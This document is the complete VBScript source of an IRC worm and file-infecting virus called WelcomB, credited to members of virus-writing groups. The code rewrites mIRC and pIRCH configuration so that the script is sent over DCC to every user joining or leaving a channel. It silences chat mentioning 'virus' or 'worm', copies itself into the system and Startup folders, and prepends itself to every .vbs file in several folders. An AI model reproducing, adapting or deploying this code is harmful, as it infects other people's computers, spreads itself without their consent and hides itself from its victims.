'Welcomb


'= VBS/mIRC/pIRCH.WelcomB.a                         =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
'= Technology used from Code Breakers               =
On Error Resume Next
Const Welcomb = 5416
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Const XWindowsFolder = 0

Dim FSO, ScrFile, Cini, InfMarker, MyCode
Dim Parent, MyWelcomb, V, VFile, EvFile
Dim FoldersToGet(2), FolderX, VCode

Set FSO = CreateObject("Scripting.FileSystemObject")
Parent = Wscript.ScriptFullName

Set Cini = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
      Cini.WriteLine "[rfiles]"
      Cini.WriteLine "n100=script.ini"
      Cini.Close

Set ScrFile = FSO.CreateTextFile("c:\mirc\script.ini", True)
  ScrFile.WriteLine "[script]"
  ScrFile.WriteLine "n0; VBS/mIRC/pIRCH WelcomB.a"
  ScrFile.WriteLine "n1=ON 1:JOIN:#:{ /if ( "+Chr(10+10+10+6)+"nick == "+Chr(10+10+10+6)+"me ) { halt }"
  ScrFile.WriteLine "n2=  /dcc send "+Chr(10+10+10+6)+"nick c:\WINDOWS\system\cute.vbs"
  ScrFile.WriteLine "n3=}"
  ScrFile.WriteLine "n4="
  ScrFile.WriteLine "n5=;ON 1:PART:#:{ /if ( "+Chr(10+10+10+6)+"nick == "+Chr(10+10+10+6)+"me ) { halt }"
  ScrFile.WriteLine "n6=/dcc send "+Chr(10+10+10+6)+"nick c:\WINDOWS\system\cute.vbs"
  ScrFile.WriteLine "n7=}"
  ScrFile.WriteLine "n8="
  ScrFile.WriteLine "n9=on 1:TEXT:*script.ini*:#:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n10=on 1:TEXT:*script.ini*:?:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n11=on 1:TEXT:*virus*:#:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n12=on 1:TEXT:*virus*:?:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n13=on 1:TEXT:*worm*:#:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n14=on 1:TEXT:*worm*:?:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n15=on 1:TEXT:*cute*:#:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n16=on 1:TEXT:*cute*:?:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n17=on 1:TEXT:*WelcomB*:#:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n18=on 1:TEXT:*WelcomB*:?:/.ignore "+Chr(10+10+10+6)+"nick"
  ScrFile.WriteLine "n19=on 1:QUIT:#:/msg "+Chr(10+10+10+6)+"chan There the Teachers that taught me to hate me"
  ScrFile.Close

Set EvFile = FSO.CreateTextFile("c:\WINDOWS\events.dll", True)
  EvFile.WriteLine "[Levels]"
  EvFile.WriteLine "Enabled=1"
  EvFile.WriteLine "Count=6"
  EvFile.WriteLine "Level1=000-Unknowns"
  EvFile.WriteLine "000-UnknownsEnabled=1"
  EvFile.WriteLine "Level2=100-Level 100"
  EvFile.WriteLine "100-Level 100Enabled=1"
  EvFile.WriteLine "Level3=200-Level 200"
  EvFile.WriteLine "200-Level 200Enabled=1"
  EvFile.WriteLine "Level4=300-Level 300"
  EvFile.WriteLine "300-Level 300Enabled=1"
  EvFile.WriteLine "Level5=400-Level 400"
  EvFile.WriteLine "400-Level 400Enabled=1"
  EvFile.WriteLine "Level6=500-Level 500"
  EvFile.WriteLine "500-Level 500Enabled=1"
  EvFile.WriteLine ""
  EvFile.WriteLine "[000-Unknowns]"
  EvFile.WriteLine "User1=*!*@*"
  EvFile.WriteLine "UserCount=1"
  EvFile.WriteLine "Event1=; VBS/mIRC/pIRCH WelcomB.a"
  EvFile.WriteLine "Event2=ON JOIN:#:/dcc send "+Chr(10+10+10+6)+"nick c:\WINDOWS\system\cute.vbs"
  EvFile.WriteLine "Event2=ON PART:#:/dcc send "+Chr(10+10+10+6)+"nick c:\WINDOWS\system\cute.vbs"
  EvFile.WriteLine "Event3=VERSION:/notice "+Chr(10+10+10+6)+"nick \-1 pIRCH: WelcomB by -KD- I'm Infected!!! \-1:-"
  EvFile.WriteLine "Event4=ON TEXT:*WelcomB*:#:/kick # "+Chr(10+10+10+6)+"nick pIRCH/VBS/mIRC"
  EvFile.WriteLine "Event5=ON TEXT:*WelcomB*:#:/ignore # "+Chr(10+10+10+6)+"nick"
  EvFile.WriteLine "Event6=ON TEXT:*vbs*:#:/ignore # "+Chr(10+10+10+6)+"nick"
  EvFile.WriteLine "Event7=ON TEXT:*virus*:#:/ignore # "+Chr(10+10+10+6)+"nick"
  EvFile.WriteLine "Event8=ON TEXT:*worm*:#:/ignore # "+Chr(10+10+10+6)+"nick"
  EvFile.WriteLine "Event9=ON TEXT:*cute*:#:/ignore # "+Chr(10+10+10+6)+"nick"
  EvFile.WriteLine "EventCount=9"
  EvFile.WriteLine ""
  EvFile.WriteLine "[100-Level 100]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[200-Level 200]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[300-Level 300]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[400-Level 400]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[500-Level 500]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.Close

FSO.CopyFile "c:\WINDOWS\events.dll", "c:\pirch32\events.ini"
FSO.CopyFile "c:\WINDOWS\events.dll", "c:\pirch98\events.ini"
FSO.CopyFile Parent, "c:\WINDOWS\system\cute.vbs"
FSO.CopyFile Parent, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"

If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "There the teacher's that taught me to hate me.", 4096 , "WelcomB"
End If

FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(XWindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(XWindowsFolder) & "\Desktop"
Set MyWelcomb = FSO.OpenTextFile(Parent, ForReading)
MyCode = MyWelcomb.Read(Welcomb)
MyWelcomb.Close

For Each FolderX in FoldersToGet
   Catch FolderX
Next

Sub Catch(TheFolder)

For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then

Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.read(8)
    VFile.close

If InfMarker <> "'Welcomb" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
      VFile.Write VCode
      VFile.close
    end if
  end if
next
End Sub
'->